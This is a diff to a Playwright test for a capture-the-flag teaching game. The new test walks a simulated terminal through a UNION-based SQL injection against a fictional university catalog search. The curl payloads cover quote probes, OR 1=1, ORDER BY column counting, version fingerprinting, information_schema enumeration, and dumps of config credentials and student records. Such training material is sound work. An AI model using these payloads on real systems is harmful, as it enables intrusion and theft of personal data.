@@ -5,6 +5,12 @@
 //                  curl autoindex; FERPA / OWASP A05 lesson).
 //   - level1@web — "Carlos's Login Wall" (IDOR via student_id query
 //                  parameter; transcript API).
+//   - level2@web — "Meridian's catalog search" (UNION-based SQL
+//                  injection via the v1.28.0 level.sqli endpoint;
+//                  curl executes the injected query for real, so the
+//                  test walks the full methodology — probe, tautology,
+//                  column count, fingerprint, information_schema
+//                  enumeration, app_config dump → DB-admin breadcrumb).
 //
 // Ported from the v1.23.x monolithic playtest.cjs lines 828-958.
 // Uses the v1.24.0 dispatchCmd helper (value-set + Enter dispatch)
@@ -225,6 +231,132 @@ test.describe("web track", () => {
     await dispatchCmd(page, "exit");
     // exit defers connectTo(LOBBY) by 200ms (setTimeout in shell.js).
     // Wait for the prompt to flip back to the guest@d3cyph3r lobby.
+    await page.waitForFunction(() => {
+      const p = document.getElementById("prompt-label");
+      return p && p.innerText.includes("@d3cyph3r:");
+    }, null, { timeout: 5000 });
+    expect(await promptText(page)).toContain("@d3cyph3r:");
+  });
+
+  test("level2@web — Meridian catalog search (UNION-based SQLi)", async ({ page }) => {
+    const URL = "https://catalog.meridian.edu/api/search";
+
+    // Wrong password first — confirm the gate works.
+    await dispatchCmd(page, "ssh level2@web");
+    await dispatchCmd(page, "nope");
+    let t = await terminalText(page);
+    expect(t).toContain("Permission denied, please try again.");
+
+    // Correct password: the portal-svc credential leaked by level1's
+    // M-0000001 demo account. connectTo() defers 300ms; wait on the
+    // banner + persistence prompt, then dismiss it.
+    await dispatchCmd(page, "ssh level2@web");
+    await dispatchCmd(page, "meridian-portal-svc-2026");
+    await waitForOutput(page, "Connected: level2@web");
+    await waitForOutput(page, "[y/N]");
+    await dispatchCmd(page, "n");
+
+    t = await terminalText(page);
+    expect(t).toContain("Connected: level2@web");
+    expect(await promptText(page)).toContain("@web:");
+    expect(await promptText(page)).toMatch(/^portal-svc@/);
+
+    await dispatchCmd(page, "ls");
+    t = await terminalText(page);
+    for (const f of [
+      "welcome.md",
+      "priya-note.md",
+      "catalog-search.js",
+      "deploy-notes.md",
+      "lessons-learned.md",
+    ]) {
+      expect(t, `ls shows ${f}`).toContain(f);
+    }
+
+    // The vulnerable handler — shows the string-concatenation glue.
+    await dispatchCmd(page, "cat catalog-search.js");
+    t = await terminalText(page);
+    expect(t).toContain("WHERE title LIKE");
+    expect(t).toContain("this is the vulnerability");
+
+    // Bonus 2 — deploy-notes.md surfaces the no-WAF / no-rate-limit finding.
+    await dispatchCmd(page, "cat deploy-notes.md");
+    t = await terminalText(page);
+    expect(t).toContain("no WAF and no rate limiting");
+    expect(t).toContain("Bonus find unlocked: Public endpoint with no WAF");
+
+    // Normal search — baseline behaviour (a real course comes back).
+    await dispatchCmd(page, `curl "${URL}?q=biology"`);
+    t = await terminalText(page);
+    expect(t).toContain("Introduction to Biology");
+    expect(t).toMatch(/"results"/);
+
+    // Single-quote probe — verbose MySQL error leaks the query
+    // (CWE-209, bonus 1).
+    await dispatchCmd(page, `curl "${URL}?q='"`);
+    t = await terminalText(page);
+    expect(t).toContain("You have an error in your SQL syntax");
+    expect(t).toContain("Database query failed");
+    expect(t).toContain("Bonus find unlocked: Verbose database errors");
+
+    // Tautology — every course returns.
+    await dispatchCmd(page, `curl "${URL}?q=' OR 1=1-- -"`);
+    t = await terminalText(page);
+    expect(t).toContain("Algorithms");
+    expect(t).toContain("Cell Biology");
+
+    // Column count — ORDER BY past the column count errors out.
+    await dispatchCmd(page, `curl "${URL}?q=zzz' ORDER BY 5-- -"`);
+    t = await terminalText(page);
+    expect(t).toContain("Unknown column '5' in 'order clause'");
+
+    // Fingerprint via UNION — server version + current database.
+    await dispatchCmd(
+      page,
+      `curl "${URL}?q=zzz' UNION SELECT @@version,user(),database(),NULL-- -"`
+    );
+    t = await terminalText(page);
+    expect(t).toContain("5.7.38");
+    expect(t).toContain("meridian_portal");
+
+    // Enumerate tables via information_schema.
+    await dispatchCmd(
+      page,
+      `curl "${URL}?q=zzz' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables-- -"`
+    );
+    t = await terminalText(page);
+    expect(t).toContain("app_config");
+    expect(t).toContain("students");
+
+    // Dump app_config — recover the DB-admin credential (level3 breadcrumb).
+    await dispatchCmd(
+      page,
+      `curl "${URL}?q=zzz' UNION SELECT config_key,config_value,NULL,NULL FROM app_config-- -"`
+    );
+    t = await terminalText(page);
+    expect(t).toContain("db.admin.password");
+    expect(t).toContain("M3rid14n-DBr00t!2026");
+
+    // The same injection reaches FERPA-protected student records — the
+    // blast-radius proof.
+    await dispatchCmd(
+      page,
+      `curl "${URL}?q=zzz' UNION SELECT student_id,full_name,email,gpa FROM students-- -"`
+    );
+    t = await terminalText(page);
+    expect(t).toContain("Aisha Patel");
+
+    await dispatchCmd(page, "cat lessons-learned.md");
+    t = await terminalText(page);
+    expect(t).toContain("CWE-89");
+    expect(t).toContain("A05:2025");
+    expect(t).toMatch(/parameteriz/i);
+
+    await dispatchCmd(page, "whoami");
+    t = await terminalText(page);
+    expect(t).toMatch(/\bportal-svc\b/);
+
+    await dispatchCmd(page, "exit");
     await page.waitForFunction(() => {
       const p = document.getElementById("prompt-label");
       return p && p.innerText.includes("@d3cyph3r:");
